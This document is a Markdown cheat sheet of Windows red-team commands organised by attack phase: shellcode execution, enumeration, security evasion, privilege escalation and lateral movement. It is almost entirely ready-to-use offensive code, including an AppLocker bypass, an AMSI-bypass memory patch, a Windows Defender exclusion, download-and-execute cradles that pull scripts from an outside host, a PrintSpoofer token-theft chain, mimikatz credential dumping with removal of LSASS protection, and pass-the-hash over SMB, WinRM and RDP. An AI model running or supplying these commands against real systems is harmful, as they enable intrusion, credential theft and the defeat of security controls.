# Windows

## Execution
### Process Injection
* execute shellcode in hex
```
.\redteam-yadokari.exe <hex>
```

* execute shellcode in hex bypassing AppLocker 
```
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Installutil.exe /logfile= /LogToConsole=false /payload=<hex> /U .\redteam-yadokari.exe"
```

## Post-Exploitation

### Basic Information
```cmd
whoami /all
systeminfo
hostname
net user
net user /domain
net localgroup
net group /domain
net start
net view
dir C:\Users
set
```

```powershell
Get-ChildItem Env:
```

### Network
```cmd
ipconfig /all
netstat -ano
arp -a
route print
for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.
```

* add firewall rule
```powershell
New-NetFirewallRule -Name 'freehack' -DisplayName 'freehack' -Description 'freehack' -Enabled True -Profile Any -Direction Outbound -Action Allow -Program Any -LocalAddress Any -RemoteAddress 192.168.2.1 -Protocol Any -LocalPort Any -RemotePort Any -LocalUser Any -RemoteUser Any
```

### Security Config
* Powershell Language Mode
```powershell
$ExecutionContext.SessionState.LanguageMode
```

* AppLocker
```
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Msi 
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Dll
```

### Sensitive Information

* autologon
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

* PowerShell history
```powershell
Get-Content (Get-PSReadlineOption).HistorySavePath
```

```powershell
Get-Content C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Download
* save
```powershell
iwr -uri http://192.168.1.1/file.txt -outfile C:\Windows\Temp\file.txt
(New-Object System.Net.WebClient).DownloadFile("http://192.168.1.1/file.txt", "C:\\Windows\\Temp\\")
```

```cmd
bitsadmin /transfer myjob /download /priority high http://192.168.1.1/file.txt C:\Windows\Temp\file.txt
```

* download and execute script in memory
```powershell
(New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/script.ps1') | IEX
$a = (New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/script.ps1'); IEX($a);
```

* load script
```powershell
Import-Module <ps1>
Get-Content <ps1> -Raw | IEX
```



### Evasion
* AMSI
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};
$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);
$ptr2 = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf2 = New-Object byte[](8);[System.Runtime.InteropServices.Marshal]::Copy($buf2, 0, $ptr2, 8);
```

* AppLocker
only for .NET PE with `RunInstaller(true)` option
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U <.NET pe>
```

any DLL with exported function
```cmd
C:\Windows\System32\rundll32.exe <DLL>,<func> <param>
```

* Windows Defender
add exclusion path
```powershell
Add-MpPreference -ExclusionPath 'C:\Windows\Temp\'
```

## Privilege Escalation
### PrintSpoofer
* Condition
- user has `SeImpersonatePrivilege`
- printer service is running at host

* Execution
1. run `angler` token-stealer
```cmd
.\redteam-angler.exe \\.\pipe\test\pipe\spoolss "C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -ep bypass -nop -c \"$a = (New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/generate/results/runner.ps1'); IEX($a)\""
```

2. run `MS-RPRN` to invoke printer service 
```cmd
.\MS-RPRN.exe \\<host> \\<host>/pipe/test
```

### winPEAS
```cmd
.\winPEAS.exe
powershell -ep bypass -nop -file .\winPEAS.ps1
```

```powershell
.\winPEAS.ps1
```

### PrivescCheck
```powershell
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended
```

### Service
get info
```cmd
sc qc <service>
```

update binPath, start, user
```cmd
sc config <service> binPath= "<path>"
sc config <service> start=demand
sc config <service> obj="NT AUTHORITY\SYSTEM"
```

### Add User
compile C code
```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

### Runas
run command as user, bypassing UAC
```powershell (Invoke-RunasCs.ps1)
Invoke-RunasCs -User <user> -Password <password> -LogonType 8 -BypassUac -Command '<command>'
```


## Lateral Movement

### Credential Gathering
* mimikatz
hash dump
```mimikatz
privilege::debug
token::elevate
sekurlsa::logonpasswords
lsadump::sam
```

disable LSA Protection (`mimidrv.sys` required)
```mimikatz
!+
!processprotect /process:lsass.exe /remove
```

kerberos ticket
```
kerberos::list /export
```

* lazagne
```
.\LaZagne.exe all
```

### Pass The Hash
* PS Remoting
- admin user
- create SYSTEM process
```bash
impacket-psexec <domain>/<user>@192.168.1.1 -hashes ":<ntlm>"
```

* Wmi Exec
- admin user
```bash
impacket-wmiexec <domain>/<user>@192.168.1.1 -hashes ":<ntlm>"
```

* Credential Dump
```bash
impacket-secretsdump <domain>/<user>@192.168.1.1 -hashes ":<ntlm>"
```

* WinRM
- Remote Management Users
```cmd
```


### Password Spray
* SMB local auth with hash
```bash
nxc smb <hosts> -d <domain> -u <users> -H <hashes> --local-auth --continue-on-success
```

* CCACHE
```bash
nxc smb <hosts> --use-kcache --kdcHost <dc>
```

### WinRM
with password
```
evil-winrm -i 192.168.1.1 -u <user> -p <password>
```

with hash
```
evil-winrm -i 192.168.1.1 -u <user> -H <ntlm>
```


### RDP
with password
```
xfreerdp /v:192.168.1.1 /u:<domain>\\<user> /p:<password> /cert-ignore
```

with hash
```
xfreerdp /v:192.168.1.1 /u:<domain>\\<user> /pth:<ntlm> /cert-ignore
```